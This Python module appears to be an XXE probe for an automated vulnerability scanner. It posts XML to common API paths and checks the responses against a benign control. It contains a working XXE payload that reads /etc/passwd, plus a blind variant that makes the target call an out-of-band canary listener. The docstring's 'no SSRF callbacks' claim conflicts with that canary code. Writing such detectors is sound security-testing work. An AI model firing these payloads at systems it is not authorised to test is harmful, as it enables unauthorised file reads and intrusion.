"""XML External Entity (XXE) injection probe (vuln phase, non-destructive).

Endpoints that parse XML with an under-hardened parser will resolve an
external entity pointing at a local file. This probe checks whether the
target accepts XML at all (the base URL and a handful of common API paths,
with `application/xml` and `text/xml`), then sends a benign local-file XXE
payload referencing `file:///etc/passwd`.

A finding is raised only when, relative to a benign control XML:

  * the response REFLECTS classic /etc/passwd content (`root:x:0:0:`) — a
    confirmed file read (high confidence), OR
  * the response reveals the parser actually tried to process the external
    entity / DOCTYPE (e.g. "failed to load external entity", "external
    entity", "DOCTYPE") while the benign control did NOT — strong evidence
    the DTD was parsed (medium confidence).

The control XML (no DOCTYPE, no entity) is sent first; if it already produces
the same entity/DOCTYPE error text, that text is just the server's generic XML
handling and is not counted as a signal. Blind XXE (no reflected file, no parser
error) is confirmed out-of-band: when an OOB interaction server is active, the
probe also sends an XXE whose external entity points at a canary URL; if the
parser resolves it and calls our listener back, the gate confirms it.

READ-ONLY: the only external entity used is a local-file read of a
non-sensitive, world-readable system file. No writes, no SSRF callbacks.
"""

from __future__ import annotations

import logging
import re
from typing import List, Optional
from urllib.parse import urlsplit

from core.swarm_engine import SwarmAgent
from core.swarm_workers import register_worker

from ._http import HttpResp, fetch, get_oob, normalize_target_url

logger = logging.getLogger("viper.swarm_workers.vuln.xxe")

TECHNIQUE = "xxe"

# Where an XML body might be accepted. Base URL ("") plus common API roots.
_XML_PATHS = [
    "", "/api", "/api/xml", "/xml", "/soap", "/api/v1", "/api/v2",
    "/services", "/rpc", "/upload",
]

# Content types worth trying — many parsers key off these.
_XML_CONTENT_TYPES = ["application/xml", "text/xml"]

# Benign local-file XXE payload (read-only, world-readable target file).
_XXE_PAYLOAD = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
    '<r>&x;</r>'
)

# Benign control: same root element, NO DOCTYPE / NO entity.
_CONTROL_PAYLOAD = '<?xml version="1.0"?><r>viper-xxe-control</r>'

# Confirmed file read — a canonical /etc/passwd line.
_PASSWD_RE = re.compile(r"root:.?:0:0:")

# Parser leaked that it processed (or failed to process) the external entity.
#
# These are PARSER-EMITTED phrasings only. The bare tokens `DOCTYPE` and
# `external entity` were deliberately removed: every XXE payload literally
# carries `<!DOCTYPE ... ENTITY ...>`, so an endpoint that merely REFLECTS the
# request body (a generic validation echo) would match them without ever having
# parsed XML — the confirmed false positive. What survives is wording an actual
# expat/lxml parser produces ("failed to load external entity", "undefined
# entity", "entity ... not defined", "XMLParseError", "lxml.etree") that a raw
# echo of our payload never contains.
_ENTITY_ERR_RE = re.compile(
    r"failed to load external entity"
    r"|undefined entity"
    r"|entity .* not defined"
    r"|XMLParseError"
    r"|XMLSyntaxError"
    r"|lxml\.etree"
    r"|not well[- ]formed"
    r"|expat",
    re.I,
)

# Verbatim fragments of OUR OWN payload. If the response body contains these,
# it is echoing what we sent (reflection), not a parser diagnostic. We blank
# such echoes out before scanning for an entity-error signal so that a
# reflecting endpoint can never trip the detector on our own DOCTYPE/ENTITY text.
_PAYLOAD_ECHO_FRAGMENTS = (
    _XXE_PAYLOAD,
    '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>',
    'file:///etc/passwd',
)


def _strip_payload_echo(body: str) -> str:
    """Remove verbatim echoes of the payload we sent.

    A reflected request body is not evidence the server parsed XML — it is the
    server handing our own bytes back. Stripping the echo means any remaining
    entity-error match came from the parser itself, not our payload.
    """
    out = body
    for frag in _PAYLOAD_ECHO_FRAGMENTS:
        if frag in out:
            out = out.replace(frag, " ")
    return out


def _origin(url: str) -> str:
    p = urlsplit(url)
    return f"{p.scheme}://{p.netloc}" if p.netloc else url.rstrip("/")


async def _post_xml(url: str, payload: str, ct: str,
                    timeout: float) -> Optional[HttpResp]:
    return await fetch(
        "POST", url,
        headers={"Content-Type": ct, "Accept": "application/xml, text/xml, */*"},
        body=payload.encode("utf-8"),
        timeout=timeout,
        follow_redirects=False,
    )


def _accepts_xml(resp: Optional[HttpResp]) -> bool:
    """Heuristic: the endpoint plausibly consumed our XML body.

    A 404 / 405 / 5xx, or no response, means there's nothing here to attack.
    Anything else (200/201/400/422/...) is treated as "the parser saw it".
    """
    if resp is None:
        return False
    if resp.status in (404, 405, 501) or resp.status >= 502:
        return False
    return True


def _entity_signal(resp: Optional[HttpResp]) -> bool:
    if not (resp and resp.body):
        return False
    # Scan only the text the server ADDED, not a reflection of our payload.
    cleaned = _strip_payload_echo(resp.body)
    return bool(_ENTITY_ERR_RE.search(cleaned))


async def run(agent: SwarmAgent) -> List[dict]:
    url = normalize_target_url(agent.target)
    if not url:
        return []
    origin = _origin(url)
    timeout = min(agent.timeout_s, 10.0)
    findings: list[dict] = []
    oob = get_oob()
    oob_fired = 0

    for path in _XML_PATHS:
        target = origin + path
        for ct in _XML_CONTENT_TYPES:
            # 1) Control first: does the endpoint take XML, and does its
            #    normal handling already emit entity/DOCTYPE error text?
            control = await _post_xml(target, _CONTROL_PAYLOAD, ct, timeout)
            if not _accepts_xml(control):
                continue
            control_entity_noise = _entity_signal(control)

            # 1b) Blind XXE: on an XML-accepting endpoint, send an external-entity
            #     pointing at an OOB canary (no-op without an OOB server; capped to
            #     a few endpoints). The gate confirms iff the parser calls back.
            if oob is not None and oob_fired < 3:
                try:
                    from core.oob.canary import payloads_for
                    canary = oob.new_canary("xxe")
                    await _post_xml(target, payloads_for(canary)["xxe"], ct, timeout)
                    findings.append({
                        "type": "xxe",
                        "vuln_type": f"xxe:blind:{path or '/'}",
                        "title": f"Blind XXE candidate at {path or '/'} (out-of-band canary)",
                        "severity": "high",
                        "url": target,
                        "parameter": "xml-body",
                        "payload": payloads_for(canary)["xxe"],
                        "cwe": "CWE-611",
                        "oob_token": canary.token,
                        "confidence": 0.5,
                        "needs_oob_confirmation": True,
                        "evidence": (f"POST {ct} XXE with an external entity to OOB "
                                     f"canary {canary.token}; submittable only if the "
                                     "XML parser calls our listener back."),
                    })
                    oob_fired += 1
                except Exception as exc:  # noqa: BLE001
                    logger.debug("xxe oob probe failed: %s", exc)

            # 2) Send the local-file XXE payload.
            resp = await _post_xml(target, _XXE_PAYLOAD, ct, timeout)
            if resp is None or not resp.body:
                continue

            # 2a) File-read confirmation — strongest signal. The control must
            #     NOT already contain passwd content (it never should).
            if _PASSWD_RE.search(resp.body) and not _PASSWD_RE.search(
                    control.body or ""):
                findings.append({
                    "type": "xxe",
                    "vuln_type": "xxe:file_read",
                    "title": f"XML External Entity (XXE) local file read at {path or '/'}",
                    "severity": "high",
                    "url": target,
                    "parameter": "xml-body",
                    "payload": _XXE_PAYLOAD,
                    "cwe": "CWE-611",
                    "confidence": 0.95,
                    "evidence": (
                        f"POST {ct} XXE payload referencing file:///etc/passwd "
                        f"reflected '/etc/passwd' content (root:x:0:0:) in the "
                        f"response; benign control XML did not"
                    ),
                    "poc_request": f"POST {target} (Content-Type: {ct}) <XXE local-file payload>",
                })
                return findings  # confirmed read — done

            # 2b) Parser error revealing external-entity processing, only if
            #     the benign control did NOT produce that same noise.
            if _entity_signal(resp) and not control_entity_noise:
                findings.append({
                    "type": "xxe",
                    "vuln_type": "xxe:entity_processing",
                    "title": f"XML External Entity (XXE) processing at {path or '/'}",
                    "severity": "medium",
                    "url": target,
                    "parameter": "xml-body",
                    "payload": _XXE_PAYLOAD,
                    "cwe": "CWE-611",
                    "confidence": 0.6,
                    "evidence": (
                        f"POST {ct} XXE payload triggered an XML-parser error "
                        f"revealing external-entity/DOCTYPE processing while the "
                        f"benign control XML parsed cleanly (no such error). "
                        f"Blind file exfiltration would need OAST to confirm."
                    ),
                    "poc_request": f"POST {target} (Content-Type: {ct}) <XXE local-file payload>",
                })
                return findings
    return findings


register_worker("vuln", TECHNIQUE, run)
